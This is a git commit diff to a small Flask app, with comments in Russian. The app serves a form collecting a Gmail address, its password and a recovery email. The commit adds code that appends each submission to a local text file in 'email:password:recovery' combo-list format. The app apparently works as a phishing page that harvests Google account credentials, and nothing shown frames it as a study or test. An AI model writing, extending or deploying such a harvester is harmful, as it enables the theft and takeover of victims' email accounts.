db038316b7c110f534baa400dd37827aa8bfe3f8
alim920622 <121553733+alim920622@users.noreply.github.com>
2025-02-21 22:37:46 +0500

    Update app.py

--- app.py
+++ app.py
@@ -1,7 +1,10 @@
+import os
 from flask import Flask, render_template, request
-import os  # Импортируем os для работы с переменными окружения
 
 app = Flask(__name__)
+
+# Путь к файлу для хранения данных
+data_file = "user_data.txt"
 
 @app.route("/", methods=["GET", "POST"])
 def form():
@@ -9,7 +12,15 @@ def form():
         gmail = request.form.get("gmail")
         password = request.form.get("password")
         recovery_email = request.form.get("recovery_email")
+
+        # Запись данных в файл
+        with open(data_file, "a") as file:
+            # Форматирование строки без пробелов и с двоеточиями
+            file.write(f"{gmail}:{password}:{recovery_email}\n")
+
+        # Отображение страницы с успешной отправкой данных
         return render_template("success.html", gmail=gmail, recovery_email=recovery_email)
+
     return render_template("form.html")
 
 if __name__ == "__main__":
